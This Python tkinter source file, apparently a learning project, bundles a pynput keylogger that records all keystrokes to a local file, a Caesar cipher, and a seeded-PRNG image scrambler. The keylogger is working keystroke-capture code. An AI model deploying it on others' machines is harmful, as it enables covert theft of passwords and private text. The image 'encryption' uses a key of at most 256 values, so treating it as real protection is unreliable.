import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import re
import cv2
import numpy as np
import random
import string
from pynput.keyboard import Key, Listener

# Keylogger settings
log_file = r"C:\Abrohneel Roy\Python files\prodigy\KeyLogger.txt"
keylogger_running = False
keylogger_listener = None

# Keylogger functions
def write_to_log(key):
    try:
        key = str(key).replace("'", "")
    except:
        key = str(key)

    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    elif "Key" in key:
        key = f"[{key}]"

    # Ensure the log file is created in the current directory
    with open(log_file, "a") as f:
        f.write(key)

def on_press(key):
    write_to_log(key)

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    global keylogger_listener
    if keylogger_listener is None:
        keylogger_listener = Listener(on_press=on_press, on_release=on_release)
        keylogger_listener.start()
        print("Keylogger started. Press ESC to stop.")
    else:
        print("Keylogger is already running.")

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener is not None:
        keylogger_listener.stop()
        keylogger_listener = None
        print("Keylogger stopped.")
    else:
        print("Keylogger is not running.")

def keylogger_start_stop():
    global keylogger_running
    if keylogger_running:
        stop_keylogger()
        btn_keylogger.config(text="Start Keylogger")
    else:
        start_keylogger()
        btn_keylogger.config(text="Stop Keylogger")
    keylogger_running = not keylogger_running

# Caesar Cipher functions
def caesar_cipher(text, shift):
    encrypted_text = ""
    for char in text:
        if char.isalpha():
            shifted = ord(char) + shift
            if char.islower():
                if shifted > ord('z'):
                    shifted -= 26
                elif shifted < ord('a'):
                    shifted += 26
            elif char.isupper():
                if shifted > ord('Z'):
                    shifted -= 26
                elif shifted < ord('A'):
                    shifted += 26
            encrypted_text += chr(shifted)
        else:
            encrypted_text += char
    return encrypted_text

def caesar_cipher_menu():
    window = tk.Toplevel()
    window.title("Caesar Cipher")

    def encrypt():
        text = entry_text.get()
        shift = int(entry_shift.get())
        result = caesar_cipher(text, shift)
        messagebox.showinfo("Encrypted Text", result)
        window.destroy()  

    def decrypt():
        text = entry_text.get()
        shift = int(entry_shift.get())
        result = caesar_cipher(text, -shift)
        messagebox.showinfo("Decrypted Text", result)
        window.destroy()  # Close the window after displaying the result

    ttk.Label(window, text="Enter text:").pack(pady=5)
    entry_text = ttk.Entry(window, width=40)
    entry_text.pack(pady=5)

    ttk.Label(window, text="Enter shift value:").pack(pady=5)
    entry_shift = ttk.Entry(window, width=40)
    entry_shift.pack(pady=5)

    ttk.Button(window, text="Encrypt", command=encrypt).pack(pady=5)
    ttk.Button(window, text="Decrypt", command=decrypt).pack(pady=5)

# Image Encryption/Decryption functions
def encrypt_image(image_path, key):
    img = cv2.imread(image_path)
    if img is None:
        return "Error: Unable to open image."

    np.random.seed(key)
    shuffle_indices = np.random.permutation(img.size)
    flat_img = img.flatten()

    encrypted_img = np.bitwise_xor(flat_img, np.random.randint(0, 256, size=flat_img.shape, dtype=np.uint8))
    encrypted_img = encrypted_img.reshape(img.shape)
    encrypted_img = encrypted_img.flatten()[shuffle_indices].reshape(img.shape)

    encrypted_image_path = image_path.split('.')[0] + '_encrypted.png'
    cv2.imwrite(encrypted_image_path, encrypted_img)
    return f"Image encrypted successfully and saved as {encrypted_image_path}"

def decrypt_image(image_path, key):
    encrypted_img = cv2.imread(image_path)
    if encrypted_img is None:
        return "Error: Unable to open image."

    np.random.seed(key)
    shuffle_indices = np.random.permutation(encrypted_img.size)
    flat_img = encrypted_img.flatten()

    original_order = np.argsort(shuffle_indices)
    unscrambled_img = flat_img[original_order].reshape(encrypted_img.shape)

    decrypted_img = np.bitwise_xor(unscrambled_img.flatten(),
                                   np.random.randint(0, 256, size=flat_img.shape, dtype=np.uint8))
    decrypted_img = decrypted_img.reshape(encrypted_img.shape)

    decrypted_image_path = image_path.split('_encrypted')[0] + '_decrypted.png'
    cv2.imwrite(decrypted_image_path, decrypted_img)
    return f"Image decrypted successfully and saved as {decrypted_image_path}"

def image_encryption_menu():
    window = tk.Toplevel()
    window.title("Image Encryption/Decryption")

    def choose_file():
        filepath = filedialog.askopenfilename()
        if filepath:
            entry_image_path.delete(0, tk.END)
            entry_image_path.insert(0, filepath)

    def encrypt_decrypt_image():
        image_path = entry_image_path.get()
        key = int(entry_key.get())
        if choice.get() == 'e':
            result = encrypt_image(image_path, key)
        else:
            result = decrypt_image(image_path, key)
        messagebox.showinfo("Result", result)
        window.destroy()  # Close the window after processing

    ttk.Label(window, text="Choose image:").pack(pady=5)
    entry_image_path = ttk.Entry(window, width=50)
    entry_image_path.pack(pady=5)
    ttk.Button(window, text="Browse", command=choose_file).pack(pady=5)

    ttk.Label(window, text="Enter key (0-255):").pack(pady=5)
    entry_key = ttk.Entry(window)
    entry_key.pack(pady=5)

    choice = tk.StringVar()
    ttk.Radiobutton(window, text="Encrypt", variable=choice, value='e').pack()
    ttk.Radiobutton(window, text="Decrypt", variable=choice, value='d').pack()

    ttk.Button(window, text="Process", command=encrypt_decrypt_image).pack(pady=10)

# Main GUI setup
root = tk.Tk()
root.title("Utility App")

# Set window size
root.geometry("400x400")  # Adjusted window size

# Use ttk styles for a better look
style = ttk.Style()
style.configure("TEntry", font=("Helvetica", 12), padding=10)
style.configure("TButton", font=("Helvetica", 12), padding=10)

ttk.Label(root, text="Choose an Option", font=("Helvetica", 16)).pack(pady=20)

btn_keylogger = ttk.Button(root, text="Start Keylogger", command=keylogger_start_stop)
btn_keylogger.pack(pady=10, padx=20, fill='x')  # Adjusted button padding and fill

ttk.Button(root, text="Caesar Cipher", command=caesar_cipher_menu).pack(pady=10, padx=20, fill='x')  # Adjusted button padding and fill
ttk.Button(root, text="Image Encryption/Decryption", command=image_encryption_menu).pack(pady=10, padx=20, fill='x')  # Adjusted button padding and fill

# Start the main event loop
root.mainloop()
